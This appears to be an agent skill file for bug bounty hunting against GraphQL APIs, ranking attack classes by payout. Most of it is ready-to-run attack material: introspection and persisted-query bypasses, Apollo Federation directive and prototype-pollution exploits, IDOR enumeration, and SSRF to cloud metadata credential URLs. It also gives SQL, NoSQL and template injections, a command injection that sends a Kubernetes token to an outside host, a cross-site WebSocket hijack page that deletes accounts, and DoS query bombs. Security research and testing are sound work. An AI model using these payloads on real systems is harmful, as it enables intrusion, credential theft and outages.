---
name: hunt-graphql
description: "Modern GraphQL hunting skill (2026 edition). Covers Apollo Federation directive bypasses (CVE-2025-64173/64347/64530, CVE-2026-32621 prototype pollution), _service{sdl} subgraph leak, _entities cross-subgraph IDOR, APQ hash-mismatch bypass, graphql-armor cost/depth bypasses, named-fragment recursion DoS, graphql-ws pre-init auth bypass, WebSocket subprotocol IDOR+SQLi, Chaos Mesh-style command-injection mutations, graphql-ruby from_introspection RCE, GraphQL secondary-context attacks, CSWSH on subscriptions, message/http XS-Search CSRF, multipart prototype pollution, scope-confusion BFLA. Built from 50 historical reports + 42 new 2024-2026 disclosures + 50+ CVEs + DEF CON 33 / OWASP AppSec / GraphQLConf 2024-2025 research."
sources: hackerone, intigriti, bugcrowd, hackerone_public, cve, portswigger, doyensec, escape, watchtowr, jfrog, runsybil, instatunnel, apollo, sentinelone
report_count: 92
last_research: 2026-05-27
---

## When to Invoke

The target accepts a POST/GET to `/graphql`, `/api/graphql`, `/query`, `/gql`, `/graph`; OR a JS bundle imports `apollo`, `graphql-tag`, `relay-runtime`, `urql`, `swr-graphql`, `gql.tada`; OR a response contains `__typename`, `__schema`, or GraphQL-shaped errors `{errors:[{message:"...",locations:[...],path:[...]}]}`; OR scope mentions Hasura/PostGraphile/Apollo/Yoga/Hot Chocolate/Lighthouse.

**Skip if**: pure REST with no GraphQL surface, or every endpoint already returns 403 to introspection AND `_service{sdl}` AND field-suggestion probes across all enum'd subgraph hosts.

---

## Crown Jewel Targets — what makes GraphQL pay big

| Target class | Why it pays | Typical bounty | Anchor disclosure |
|---|---|---|---|
| Multi-tenant SaaS w/ GraphQL admin → cross-tenant IDOR | Cross-org data, regulated PII | $5k–$25k | Shopify BillingDocument ($5k), Stripe UpdateAtlasApplicationPerson, TikTok AddRulesToPixelEvents |
| Bug bounty / security platform → object-ID enumeration | NDA-class data, program leak | $12k–$25k | HackerOne CreateOrUpdateHackerCertification ($12.5k), Cyberw1ng 2025 ($25k) |
| Social-graph platform → missing field auth on nested object | PII at scale | $5k–$15k+ | Facebook Page admin email ($15k, Mar 2025) |
| Apollo Federation gateway → directive bypass / `_entities` IDOR | Cross-subgraph read; reaches PII/payments | $5k–$30k+ (no public yet) | CVE-2025-64172/64173/64347/64530 patches; InstaTunnel Federated Sub-graph Injection writeup |
| GraphQL → RCE chain (graphql-ruby, Chaos Mesh, Magento SessionReaper, deserialization) | Pre-auth RCE | $10k–$50k (private) / KEV-listed | CVE-2025-27407, CVE-2025-59359/60/61, CVE-2025-54236 |
| MFA/OTP brute via mutation aliasing burning paid backend | Account takeover + cost | $10k–$15k | HackerOne H1 #3287208 ($12.5k SMS budget burn) |
| GraphQL SQLi/NoSQLi/SSTI in resolver | Direct DB compromise | $2.5k–$10k+ | H1 #435066 (`embedded_submission_form_uuid`), legal-templates WebSocket SQLi (Apr 2026, $2k) |
| Pre-auth GraphQL on enterprise tool | Mass exploitation | KEV bracket | Chaos Mesh, Adobe Commerce SessionReaper, Magento CosmicSting |
| AppSync/Hasura/Strapi/PostGraphile auto-gen mutations exposed | Schema mass-assignment | $1k–$10k | Hasura `update_many` GHSA-g7mj-g7f4-hgrg |

**Skip these as starvation work**: introspection-enabled-in-production with no follow-up (most Shopify, GitHub, Twitter/X programs already paid out and now reject), single-account self-DoS via depth/alias (post-Oct 2025 HackerOne policy), informational schema visibility, theoretical CSRF without auth-state impact, depth-bomb DoS on a target with mature complexity limits.

---

## The 2026 Reality Check — What's Actually Paying Right Now

Patterns repeated 3+ times in 2024-2026 disclosures (priority order):

1. **`_service { sdl }` leak even when introspection is disabled** — every Apollo Federation subgraph auto-installs this field; bypasses every `disableIntrospection` config. Always probe (RunSybil "Beyond Introspection," 2025).
2. **Apollo Federation directive bypass cluster (CVE-2025-64172/64173/64347/64530)** — `@authenticated`/`@requiresScopes`/`@policy` not enforced when (a) used on interface and queried via implementing-type fragment, (b) renamed via `@link import`, (c) reached transitively via `@requires(fields: "X")` dependency.
3. **Apollo Federation prototype pollution (CVE-2026-32621)** — aliases/variables named `__proto__`/`constructor`/`prototype` pollute `Object.prototype` across all subsequent gateway requests.
4. **APQ hash-mismatch bypass on Apollo Router** — APQ `!=` safelisting; submit any query with `sha256Hash=000...0` and Router logs warning but executes (pre-1.61.2). Pattern: APQ register-on-first-use defeats all WAF rules that inspect `query` body.
5. **Named-fragment recursion DoS (CVE-2025-32032/32034/31496)** — single query whose recursive named-fragment expansion exceeds cost limits BEFORE the limit fires; bypasses depth/complexity caps.
6. **Operation-limit integer overflow (CVE-2025-32033)** — push counter past 4,294,967,295 → wraps to 0 → all Apollo Router limits silently disable.
7. **graphql-armor cost-limit `__schema` bypass** — name the operation/fragment `__schema` → `computeComplexity` returns 0.
8. **graphql-ws pre-init auth bypass (CVE-2026-35523)** — send `start` over legacy `graphql-ws` subprotocol without `connection_init` → `on_ws_connect` skipped (Strawberry ≤0.312.2).
9. **graphql-ruby `from_introspection` RCE (CVE-2025-27407, CVSS 9.0)** — `class_eval`/`instance_eval` on attacker-controlled introspection JSON.
10. **HackerOne $12.5k SMS-burn mutation aliasing (H1 #3287208, Apr 2026)** — 1000 SMS sends from one HTTP request. Generalize: any mutation triggering a metered external action (Twilio, SendGrid, Stripe, OpenAI, AWS Lambda).
11. **Chaos Mesh / Hot Chocolate OS-command-injection mutations (CVE-2025-59359/60/61)** — String arg flows into `fmt.Sprintf("tc qdisc add dev %s ...", arg)` then `exec`. CVSS 9.8.
12. **GraphQL secondary-context attacks** (Vandevanter, OWASP AppSec SF 2024) — `ID` is a string; `node(id:"../admin")` becomes path-traversal into adjacent microservices when GraphQL frontend forwards to REST backend.
13. **WebSocket subprotocol IDOR + error-based SQLi** ($2k, Apr 2026) — `/graphql-ws` has different auth middleware than HTTP; high-entropy IDs are not authorization.
14. **`message/*` Content-Type XS-Search CSRF (GHSA-9q82-xgwf-vj6h)** — Chrome 2025 browser bug skipped CORS preflight; Apollo Server <5.5.0 vulnerable; cookie-auth targets exposed.
15. **Hot Chocolate parser StackOverflow (CVE-2026-40324)** — pre-validation DoS via 40 KB nested document; bypasses MaxExecutionDepth, complexity, persisted-query allow-lists; .NET process kill.

---

## Attack Surface Signals

### URL patterns
```
/graphql              /api/graphql           /v1/graphql            /v2/graphql
/query                /gql                   /graph                 /internal/graphql
/api/v2/graphql       /staff/graphql         /admin/graphql         /graphql-ws
/subscriptions        /api/graphiql          /sandbox               /apollo
/playground           /altair                /voyager               /explorer
/_service             /federation            /supergraph
/Shibboleth.sso/...   /api/graphql/stream    /graphql/stream        /graphql/sse
```

### JS bundle patterns
```js
"query {"  "mutation {"  "subscription {"  "__typename"  "__schema"
"apollo"  "ApolloClient"  "ApolloLink"  "Apollo Federation"  "gql`"
"graphql-tag"  "operationName"  "GRAPHQL_URI"  "useQuery"  "useMutation"
"useSubscription"  "graphql-ws"  "graphql-transport-ws"  "Sec-WebSocket-Protocol"
"persistedQuery"  "sha256Hash"  "extensions.persistedQuery"
"@apollo/client"  "@apollo/server"  "@apollo/gateway"  "@apollo/router"
"@apollo/federation"  "urql"  "relay-runtime"  "Hasura"  "x-hasura-admin-secret"
"strawberry-graphql"  "graphene"  "Lighthouse"  "Hot Chocolate"  "graphql-yoga"
"automaticPersistedQueries"  "APQ"  "trustedDocuments"
```

### Tech-stack tells
- **Apollo Server v3** — `application/json` accepted with no CSRF prevention by default; `graphql-upload` (CSRF via multipart in <2.25.4)
- **Apollo Server v4** — `allowBatchedHttpRequests: false` by default; if true, full pre-v4 batching attack surface returns
- **Apollo Router** — header `X-Apollo-Operation-Name`, `apollographql-client-name`; check `/health?live=true`
- **Apollo Federation** — query `{_service{sdl}}` returns SDL; `_entities` field present on every subgraph
- **Hasura** — `x-hasura-admin-secret` header, error envelope `extensions.code: "validation-failed"`, PostgreSQL-style error chain
- **Hot Chocolate (.NET)** — `Banana Cake Pop` UI on `/graphql`; parser error format
- **graphql-ruby** — Rails app + ApolloClient on the frontend; `from_introspection` may consume external schemas
- **graphql-yoga** — header `X-Yoga-Id` (Yoga v3); CSRF prevention plugin opt-in
- **Strawberry / Ariadne** — Python; usually behind Starlette; legacy `graphql-ws` subprotocol enabled by default
- **PostGraphile** — auto-generated CRUD; introspection returns full DB schema names
- **Hasura allow-list** — operations endpoint; bypass via whitespace/comment/case
- **AWS AppSync** — `x-api-key` header; URL `*.appsync-api.<region>.amazonaws.com`
- **Apollo Studio Embeddable Sandbox** (`<iframe src="apollo-sandbox">`) — CSRF via postMessage (CVE-2025-59845)

---

## Discovery & Fingerprinting

```bash
# Step 1 — minimal probe
curl -s https://t/graphql -X POST -H 'Content-Type: application/json' -d '{"query":"{__typename}"}'

# Step 2 — fingerprint server
graphw00f -t https://t/graphql -d -f

# Step 3 — standard introspection
curl -s https://t/graphql -X POST -H 'Content-Type: application/json' -d @full-introspection.json | jq . > schema.json

# Step 4 — IF blocked, try in order:
# (a) Federation subgraph SDL leak (works without introspection)
curl -s https://t/graphql -d '{"query":"query{_service{sdl}}"}'

# (b) Targeted __type queries
curl -s https://t/graphql -d '{"query":"{__type(name:\"Query\"){fields{name args{name type{name}}}}}"}'
curl -s https://t/graphql -d '{"query":"{__type(name:\"Mutation\"){fields{name args{name type{name}}}}}"}'

# (c) Field-suggestion brute force (InQL v6.1.0 / clairvoyance)
clairvoyance https://t/graphql -o schema.json
# Or in Burp: InQL v6.1.0 → Schema Brute-Forcer + Engine Fingerprinter

# (d) Subscription channel
wscat -c wss://t/graphql -s graphql-transport-ws
> {"type":"connection_init"}
> {"id":"1","type":"subscribe","payload":{"query":"{__schema{types{name}}}"}}

# (e) Apollo APQ hash-mismatch (APQ != safelist)
curl -s https://t/graphql -d '{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"0000000000000000000000000000000000000000000000000000000000000000"}}}'

# (f) Operation-name prefix bypass
curl -s https://t/graphql -d '{"query":"query __schemaFakeName { sensitiveField { value } }"}'

# (g) Alternative paths
for p in /graphql /api/graphql /v1/graphql /v2/graphql /internal/graphql /admin/graphql /query /staff/graphql; do
  curl -so /dev/null -w "%{http_code} $p\n" https://t$p -X POST -d '{"query":"{__typename}"}'
done
```

### Server engine signatures (InQL v6.1.0 fingerprinter)

| Engine | Probe response signature |
|---|---|
| Apollo Server | `"Directive \"@deprecated\" may not be used on QUERY"` |
| graphql-ruby | Different `@deprecated` error wording |
| Hot Chocolate | Parser error BEFORE validation (relevant for CVE-2026-40324) |
| Hasura | `extensions.code: "validation-failed"` + PostgreSQL chain |
| async-graphql (Rust) | Directive error format; honors `Schema::limit_directives` post CVE-2024-47614 |
| graphql-yoga | `X-Yoga-Id` response header |
| PostGraphile | Auto-CRUD names like `allUsers`, `userById` |

---

## Cloud Metadata Matrix (for SSRF-via-GraphQL chaining)

When a mutation arg accepts a URL, always probe:

```graphql
mutation { fetchUrl(url:"http://169.254.169.254/latest/meta-data/iam/security-credentials/") { body } }
mutation { importFromUrl(url:"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token") { content } }
mutation { ogScrape(url:"gopher://internal:6379/_INFO") { meta } }
mutation { registerOAuthClient(input:{logoUri:"http://169.254.169.254/latest/meta-data/", jwksUri:"...", redirectUri:"..."}){clientId} }
```

Cross-reference [`hunt-ssrf`](../hunt-ssrf/SKILL.md) and [`hunt-metadata-ssrf`](../hunt-metadata-ssrf/SKILL.md) for the full IMDS playbook. Apollo Router with Rhai/JS scripting that fetches URLs based on request data is a researcher-grade SSRF surface.

---

## Apollo Federation Attack Playbook (the biggest 2024-2026 shift)

Federation v2 introduced `_entities`, `_service { sdl }`, and `@key`/`@requires`/`@fromContext` — none existed pre-Federation. 2025-2026 brought four sister CVEs in the directive layer and a prototype-pollution gateway CVE.

### Enumerate subgraphs anonymously when supergraph is up
```bash
# Always works even if __schema disabled
curl -X POST https://api.target.com/graphql -d '{"query":"query{_service{sdl}}"}'
```

### Direct subgraph hit (if reachable via SSRF / internal pivot / leaked DNS)
```bash
for sg in users orders billing inventory notifications; do
  curl -s http://${sg}-svc.internal:4000/graphql \
    -d '{"query":"{_service{sdl}}"}' | tee ${sg}.sdl
done
```

### `_entities` direct invocation (cross-subgraph IDOR)
```graphql
mutation Pivot {
  _entities(representations: [
    {__typename:"User", id:"1"},
    {__typename:"User", id:"2"},
    {__typename:"Account", id:"abc-attacker"},
    {__typename:"PaymentMethod", id:"guess-victim-pm-id"}
  ]) {
    ... on User { email passwordHash mfaSecret }
    ... on Account { internalBalance kycDocuments { url } }
    ... on PaymentMethod { cardNumberLast4 tokenizedFullPan }
  }
}
```

### Cross-subgraph alias smuggling (works without direct subgraph access)
```graphql
query LeakRiskScore {
  node(id: "User:123") {
    ... on User {
      username
      _onBilling_internalRiskScore: internalRiskScore  # gateway issues _entities to Billing
    }
  }
}
```

### Directive bypass #1 — Transitive `@requires` (CVE-2025-64172)
```graphql
# Schema:
#  type Product @key(fields:"id") {
#    id: ID!
#    price: Money @authenticated
#    taxAmount: Money @requires(fields:"price")  # NO @authenticated
#  }
{ product(id:1) { taxAmount { amount } } }   # Anon → price fetched internally, leaks via tax
```

### Directive bypass #2 — Interface fragment (CVE-2025-64530)
```graphql
# Schema:
#  interface Node @authenticated { id: ID! }
#  type User implements Node { id: ID! email: String! }
{ node(id:1) { ... on User { email } } }     # 200 OK, NO auth required
```

### Directive bypass #3 — Renamed directive (CVE-2025-64347)
```graphql
# admin renamed @authenticated → @myAuth via @link import
# Apollo Router <1.61.12 silently does NOT enforce @myAuth
# All decorated fields unprotected
{ allUsers { email passwordHash } }
```

### Directive bypass #4 — Polymorphic uniform-impl (CVE-2025-64173)
Auth directive on interface; all implementing types have no directive applied; Router applies to interface, ignores when querying via concrete object.

### Operation-limit integer overflow (CVE-2025-32033)
Generate single request whose `max_aliases`/`max_root_fields`/`max_depth` counter exceeds 4,294,967,295 (u32::MAX) via nested fragment expansion compute → counter wraps to 0 → all configured limits silently disable.

### Named-fragment recursion DoS (CVE-2025-32032/32034/31496)
```graphql
fragment F0 on Q { f1: q { ...F1 } f2: q { ...F1 } }
fragment F1 on Q { g1: q { ...F2 } g2: q { ...F2 } }
fragment F2 on Q { h1: q { ...F0 } }
query { ...F0 }
```
Query planner re-expands per spread (not per fragment); CPU exhaust BEFORE limits fire.

### Prototype pollution via aliases / variables (CVE-2026-32621)
```graphql
query {
  __proto__: user(id:1) { name }
  user(id:2) { constructor: name }
}
```
Or compromised subgraph returns:
```json
{"data":{"__proto__":{"polluted":true},"constructor":{"prototype":{"isAdmin":true}}}}
```
`Object.prototype` is process-shared in Node — ONE polluting request affects ALL subsequent requests on that gateway instance. Patches: `@apollo/gateway` / `@apollo/query-planner` ≥ 2.9.6/2.10.5/2.11.6/2.12.3/2.13.2.

---

## Persisted-Query / APQ / Trusted-Document Bypass

| Server | Bypass | Payload |
|---|---|---|
| Apollo Router (pre-1.61.x) | Hash mismatch only logs warning, executes anyway | `extensions.persistedQuery.sha256Hash=000...0` + full `query` body |
| Apollo Server (any) with APQ | APQ != safelist; cache writes any submitted op | Submit op once with `query`+`hash`; later runs as if persisted |
| Hasura allowlist | Whitespace/comment/case hash mutation | Insert `# x\n` between fields, or change case of operation name |
| Grafbase / Hive Conductor / Apollo Router | Dev `bypass_header_*` left in prod | `X-<configured-bypass-header>: <leaked-value>` (grep JS bundles + git history) |
| Trusted-document signing | Manifest tampering if signing not pinned | Re-sign manifest with weak shared secret; MITM if CDN-fetched without integrity |
| Apollo Federation v2 | Subgraph direct-access skips supergraph persisted-query enforcement | `_entities` directly to subgraph IP |

### APQ probe sequence
```bash
# Step 1 — provoke miss
curl -s https://t/graphql -d '{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"deadbeef"}}}'
# Expected: {"errors":[{"message":"PersistedQueryNotFound"}]}

# Step 2 — register attacker query (if register-on-first-use enabled)
HASH=$(echo -n "{__schema{types{name}}}" | sha256sum | cut -d' ' -f1)
curl -s https://t/graphql -d "{\"query\":\"{__schema{types{name}}}\",
  \"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"$HASH\"}}}"

# Step 3 — fire hash-only, no body needed; defeats WAF rules on query body
curl -s https://t/graphql -d "{\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"$HASH\"}}}"
```

---

## graphql-armor / graphql-shield Bypass Matrix

| # | Defense | Bypass | Version / CVE |
|---|---|---|---|
| 1 | `graphql-armor-cost-limit` w/ `ignoreIntrospection: true` (default) | Name your operation/fragment `__schema` → `computeComplexity` returns 0 for ALL node-kinds matching that name | ≤2.4.0, fixed 2.4.2 / GHSA-733v-p3h5-qpq7 |
| 2 | `graphql-armor-max-depth` | Fragment-cache poisoning — first occurrence's depth cached; reuse at greater depth bypasses limit | ≤2.4.1, fixed 2.4.2 / GHSA-224p-v68g-5g8f |
| 3 | `graphql-armor-max-aliases` allowlist | Default `allowList:['__typename']` — alias every batch slot `__typename` with real selection; counter sees zero aliases | All versions w/ default config |
| 4 | Apollo Router operation-limits | u32 counter wraparound — push counter past 4,294,967,295 via nested fragment expansion compute → wraps to 0 → ALL limits disable | <1.61.2 / 2.0.0-alpha.0..2.1.0 / CVE-2025-32033 |
| 5 | Apollo Router cost/depth | Named-fragment exponential expansion before limits | <1.61.2 / CVE-2025-32034 |
| 6 | Apollo Compiler validation | Same root cause at validation stage | <1.27.0 / CVE-2025-31496 |
| 7 | Apollo Router coprocessor | Multi-MB body accumulates before any limit check → OOM | 1.21.0..1.52.1 / CVE-2024-43783 |
| 8 | graphql-java introspection limits | ENF not counted toward DoS budget; recursive introspection through complex types skips throttling | <21.5 / CVE-2024-40094 |
| 9 | Directus per-request resolver guard | Alias-based field dup; no per-request resolver dedup | <10.12.0 / CVE-2024-39895 |
| 10 | GitLab GraphQL complexity | Blob-size estimation; JSON-validation not counted; unauth complexity | CVE-2025-3922 / 8014 / 10004 / 11447 |
| 11 | async-graphql directive limit | No max-directives — `@a @b @c ...×1000` on one field exhausts memory | <7.0.10 / CVE-2024-47614 |
| 12 | Juniper fragment-recursion | Circular named fragments → uncontrolled recursion | ≤0.15.9 / GHSA-4rx6-g5vg-5f3j |
| 13 | gqlparser/gqlgen (Go) directive limit | Append N non-existent `@directives` — allocates per directive | <2.5.15 / CVE-2023-49559 (still in 2024-2026 forks) |
| 14 | graphql-shield rule cache | Cryptographically insecure hash → key collision → wrong-rule cache hit | <6.0.6 / SNYK-JS-GRAPHQLSHIELD-460445 |
| 15 | Apollo Federation interface directives | Auth directive on interface not propagated to implementing types | <2.9.5/2.10.4/2.11.5/2.12.1 / CVE-2025-64530 |
| 16 | API Platform GraphQL security | Relay `node(id:)` skips operation `security` attribute | <3.4.17/4.0.22 / CVE-2025-31481 |
| 17 | Strawberry auth-on-WS-connect | Legacy `graphql-ws` skips `connection_init` check | ≤0.312.2 / CVE-2026-35523 |
| 18 | Strawberry per-connection sub limits | Flood `subscribe` messages with unique IDs → unbounded asyncio.Task | ≤0.312.2 / CVE-2026-35526 |
| 19 | Hot Chocolate parser depth | Recursive-descent parser no depth limit → StackOverflowException BEFORE validation, bypasses MaxExecutionDepth + complexity + persisted-query allow-lists | <12.22.7/13.9.16/14.3.1/15.1.14 / CVE-2026-40324 |
| 20 | graphql-ruby schema loader | `class_eval`/`instance_eval` on untrusted introspection JSON | <1.11.8/1.12.25/1.13.24/2.0.32/2.1.14/2.2.17/2.3.21 / CVE-2025-27407 |
| 21 | Apollo Federation prototype pollution | Aliases/variables named `__proto__`/`constructor`/`prototype` | <2.9.6/2.10.5/2.11.6/2.12.3/2.13.2 / CVE-2026-32621 |

---

## Authorization Attacks

### Broken Object Level Authorization (BOLA / IDOR) — highest-paying class

**Sequential integer ID enum on every `id:`-accepting field**
```graphql
query {
  doc1: document(id: 1) { content }
  doc2: document(id: 2) { content }
  doc3: document(id: 3) { content }   # ... up to alias batch limit
}
```

**Global Relay ID (base64) enum — base64-decode `User:1`**
```graphql
query { node(id: "VXNlcjox") { ... on User { email passwordHash mfaSecret } } }
query { node(id: "T3JkZXI6MQ==") { ... on Order { total customer { email } } } }
```

**API Platform Relay node bypass (CVE-2025-31481)**
```graphql
# Symfony api-platform deployments < 4.0.22 / 3.4.17
{ node(id: "/users/1") { ... on User { email passwordHash } } }
# Bypasses any is_granted('ROLE_USER') because node() constructs new Query operation
# without inheriting the original operation's security attribute
```

**Alias-amplified multi-IDOR in single request**
```graphql
query {
  victim1: user(id: 1) { email phone ssn }
  victim2: user(id: 2) { email phone ssn }
  victim100: user(id: 100) { email phone ssn }
}
```

**Fragment-based IDOR bypass (nested fields skip authz)**
```graphql
query {
  document(id: $myDoc) {
    ...DocumentFields
    relatedDocuments { ...DocumentFields }   # nested doesn't re-check authz
  }
}
fragment DocumentFields on Document { id ownerId content secretField }
```

**Secondary-context attack (Vandevanter, OWASP AppSec SF 2024)**
GraphQL `ID` is just a string. If the GraphQL frontend forwards user-supplied IDs to a downstream REST microservice URL, `id: "../admin"` becomes path-traversal into adjacent microservices the user shouldn't reach.

### Broken Function Level Authorization (BFLA)

**Admin mutations accessible to low-privilege users — schema reveals them even when UI hides**
```graphql
mutation { deleteUser(id: 999) { success } }
mutation { promoteToAdmin(userId: 1) { success } }
mutation { impersonate(targetUserId: 1) { sessionToken } }
mutation { rotateApiKey(forUserId: 1) { newKey } }
mutation { updateMembership(input:{userId:"self", grants:["view_financials","manage_apps","admin"]}) { success } }
```

**Scope-confusion BFLA (GitLab CVE-2025-11340)** — `read_api`-scoped token executes a mutation because the mutation handler didn't re-check token scope at resolver
```graphql
# With read_api-scoped GitLab token
mutation { vulnerabilityDismiss(input:{id:"gid://Vuln/1"}) { vulnerability { id } } }
```

**Deactivated/disabled account still uses GraphQL** — session middleware applied to REST but not GraphQL handler. Test: deactivate account, issue GraphQL with old session cookie.

**Operation-name as authorization input (broken pattern)**
```graphql
query __schemaFakeName { sensitiveQuery { ... } }
# Gateway checks if op name starts with __schema to allow introspection
# but doesn't check actual operation content
```

**Renamed-directive bypass (Apollo CVE-2025-64347)** — `@authenticated` renamed via `@link import: [{name:"@authenticated", as:"@myAuth"}]` is silently NOT enforced in Apollo Router <1.61.12.

**Interface-directive bypass (Apollo CVE-2025-64530)** — `@authenticated` on interface, query via implementing-type fragment skips check.

**Transitive `@requires` bypass (Apollo CVE-2025-64172)** — field B with `@requires(fields:"A")` where A is `@authenticated` but B isn't. Querying B fetches A internally without auth.

### Custom Directive Logic Bypass ("Directive Deception")

- **@auth via fragment evasion**: middleware checks top-level field for `@auth` but doesn't recurse into fragments → `query { ... on Query { sensitive } }`.
- **Directive injection** into dynamically-built queries: `"price") @include(if: true) @customDirective(arg: "x") #`.
- **Cache miss amplification** via `@cacheControl(scope: PRIVATE)` + dummy args.

---

## Injection Attacks via GraphQL

### OS Command Injection (Chaos Mesh pattern, CVE-2025-59359/60/61, CVSS 9.8)
```graphql
# Mutation arg flows into fmt.Sprintf → exec
mutation { cleanTcs(input:{device:"eth0; curl http://atk/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"}){success} }
mutation { killProcesses(input:{pid:"1; id > /tmp/x"}){success} }
mutation { cleanIptables(input:{chain:"FORWARD; cat /etc/shadow"}){success} }
```
Hunt: every GraphQL String/ID arg naming a device/process/path/host/CIDR — fuzz with `;id;`, `$(id)`, backticks, `|id`.

### SQL Injection
```graphql
query { embeddedSubmissionForm(uuid: "x' UNION SELECT password FROM users-- -") { id } }
query { resource(uuid: "x'; SELECT pg_sleep(5)-- -") { id } }

# Craft CMS pattern (CVE-2024-37843)
query { search(filter: "x'; SELECT * FROM users WHERE '1'='1") { results { content } } }

# UUID non-canonical bypass (regex passes, DB still parses)
query { resource(uuid:"12345678123412341234123456789012") { secret } }
query { resource(uuid:"{12345678-1234-1234-1234-123456789012") { secret } }

# Error-based over WebSocket (April 2026 $2k chain)
{"id":"1","type":"subscribe","payload":{"query":"subscription{doc(id:\"x'||(SELECT email FROM users LIMIT 1)||'\")}"}}
```

### NoSQL Injection
```graphql
query { users(filter: {email: {$ne: null}, role: "admin"}) { id email } }
query { users(filter: "{\"$where\":\"sleep(5000)\"}") { ... } }

# Mongoose nested $where bypass (CVE-2025-23061, post-CVE-2024-53900)
query { users(filter:{$or:[{a:1, $where:"sleep(5000)"}]}) { id } }
```

### SSTI in template fields
```graphql
mutation { sendEmail(to:"victim@x.com", template:"{{7*7}}") { ... } }   # 49 = Jinja2/Twig
mutation { renderTemplate(input:"#{7*7}") { output } }                  # 49 = SpEL
mutation { generateReport(template:"${T(java.lang.Runtime).getRuntime().exec('id')}") {} }
```

### Server-Side Request Forgery (SSRF)
```graphql
mutation { fetchUrl(url:"http://169.254.169.254/latest/meta-data/iam/security-credentials/") { body } }
mutation { importFromUrl(url:"http://localhost:6379/") { content } }
mutation { ogScrape(url:"gopher://internal:8080/_GET%20/admin") { meta } }
mutation { registerOAuthClient(input:{logoUri:"http://internal/", jwksUri:"http://...", redirectUri:"..."}){clientId} }
```

### Deserialization (Magento SessionReaper CVE-2025-54236 pattern)
```graphql
# Adobe Commerce / Magento — nested deserialization via REST/GraphQL/SOAP
# ServiceInputProcessor coerces nested input → unserialize() on class name
mutation {
  setShippingAddressesOnCart(input:{
    cart_id:"...",
    shipping_addresses:[{address:{__type:"O:8:\"stdClass\":..."}}]
  }) { cart { id } }
}
```

### Prototype Pollution
- **Via field aliases / variable names** (Apollo Federation CVE-2026-32621) — `__proto__`, `constructor`, `prototype` as aliases/vars
- **Via multipart upload `map` field** (graphql-upload-minimal AIKIDO-2025-10884) — `map={"0": ["variables.__proto__.isAdmin"]}`

### LDAP injection
GraphQL `filter:` against Active Directory backends: `filter:"(&(uid=*)(password=*))"`.

### Custom Scalar Attacks

| Scalar | Attack | Real impact |
|---|---|---|
| **JSON** | Pass raw `{"$ne":null}` / `{"__proto__":{"isAdmin":true}}` / `{"$where":"sleep(5000)"}`; bypasses GraphQL type system | NoSQLi (CVE-2025-23061), prototype pollution (CVE-2026-32621) |
| **Upload** | Path traversal in filename, prototype pollution via `map`, CSRF, polyglot, SSRF via fetch variants | RCE, ATO |
| **DateTime** | Parse-then-stringify confusion: `"2020-01-01T00:00:00Z' OR '1'='1"` → second-order SQLi; integer overflow `9999999999999` | SQLi, business-logic bypass |
| **URL** | Server validates as URL but no scheme allowlist → `file://`, `gopher://`, `dict://`, IMDS | SSRF |
| **UUID** | Non-canonical: `{12345678-1234-...}`, no-brace, no-hyphen → bypass regex while DB parses | SQLi, IDOR bypass |
| **EmailAddress** (`graphql-scalars`) | RFC 5321 quoted local-part: `"<script>"@x.com` → stored XSS in confirmation email | XSS, CRLF header injection |
| **BigInt** | JS Number-vs-BigInt confusion: 9007199254740993 → 9007199254740992 in JSON.parse | Session/object-ID truncation collisions |

---

## Subscription / WebSocket Attack Playbook

### Legacy `graphql-ws` subprotocol (deprecated but common)

**Pre-init auth bypass (CVE-2026-35523, Strawberry ≤0.312.2)**
```
WS handshake: Sec-WebSocket-Protocol: graphql-ws
Frame 1: {"id":"1","type":"start","payload":{"query":"subscription{secretFeed{token}}"}}
# No connection_init sent → on_ws_connect skipped
```

### Modern `graphql-transport-ws`

**Cross-Site WebSocket Hijacking (CSWSH)** — Origin-validation gap. Attacker page:
```html
<script>
const ws = new WebSocket('wss://target.com/graphql', 'graphql-transport-ws');
ws.onopen = () => {
  ws.send(JSON.stringify({type:'connection_init'}));
  ws.send(JSON.stringify({id:'1', type:'subscribe', payload:{query:'mutation { deleteAccount }'}}));
};
</script>
```
Cookies auto-attach; server replays user's session. Include Security 2025 proven against real GraphQL APIs with HTTP CSRF protection but no WS Origin check. PortSwigger Top 10 Web Hacking 2025 nomination.

**connection_init credential capture** — clients send JWT in `connection_init.payload.Authorization`; server logs whole payload. SSRF/log4j/Kibana → search logs for plaintext tokens.

**Unbounded subscribe-message flood (Strawberry CVE-2026-35526)** — one `connection_init` → flood `subscribe` with unique IDs → unbounded `asyncio.Task` → OOM.

### `graphql-sse` (Server-Sent Events)

Two-protocol modes: distinct + single-connection. Distinct mode reserves via PUT `/graphql/stream`; auth often only at reservation. Test: complete reservation as user A, swap session to user B for GET, observe if A's events still stream.

### Universal subscription attacks

- **Auth checked on connect, not per-event** — subscription opens with valid token; token expires/revokes mid-stream; events keep flowing
- **Wrong-room emit** — chat/collab apps `pubsub.publish("doc:"+docId)`. Subscribe to `doc:VICTIM_ID` if server only checks handshake not variable
- **Introspection over WebSocket** — when HTTP `__schema` returns 403, open WS → send `connection_init` → `subscribe` introspection. Multiple H1 reports (Nuri #862835, 2025 AI-Pentest BFLA)
- **Apollo Router subscription bridge** — Federation subscriptions: client → router → subgraph WS. If subgraph trusts router headers without re-auth, direct subgraph WS hit with crafted `x-user-id` becomes that user
- **Apollo Server pre-2.14.2 NoIntrospection on subscriptions skipped** — subscription server skipped validation rules
- **Duplicate-subscription memory leak (`subscriptions-transport-ws`)** — never `GQL_STOP` after `GQL_COMPLETE`; `connectionContext.operations` retains forever

---

## File Upload via GraphQL Multipart

GraphQL multipart spec (`operations`, `map`, `0`, `1`...) parsed by `graphql-upload` / `graphql-upload-minimal` / Apollo built-in / Yoga.

```
POST /graphql HTTP/1.1
Content-Type: multipart/form-data; boundary=----X
------X
Content-Disposition: form-data; name="operations"

{"query":"mutation($f:Upload!){uploadAvatar(file:$f){url}}","variables":{"f":null}}
------X
Content-Disposition: form-data; name="map"

{"0":["variables.f"]}
------X
Content-Disposition: form-data; name="0"; filename="avatar.png"
Content-Type: image/png

<bytes>
------X--
```

### Attacks (2024-2026)

1. **Path traversal in filename** — `filename="../../../../../var/www/html/shell.php"`. graphql.org's 2025 file-upload guidance explicitly warns.
